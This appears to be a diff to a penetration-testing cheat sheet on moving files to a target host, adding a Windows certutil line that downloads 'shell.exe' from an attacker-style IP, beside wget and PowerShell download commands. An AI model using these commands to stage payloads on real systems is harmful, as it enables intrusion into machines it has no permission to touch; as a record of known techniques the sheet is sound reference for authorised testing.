@@ -45,6 +45,9 @@ Linux
 wget 10.10.10.10/file -O /tmp/file
 ```
 Windows
+```cmd
+certutil -urlcache -f http://10.10.10/shell.exe shell.exe
+```
 ```powershell
 Invoke-WebRequest -uri 10.10.10.10/file.exe -outfile C:\\\\Windows\\temp\\file.exe
 ```
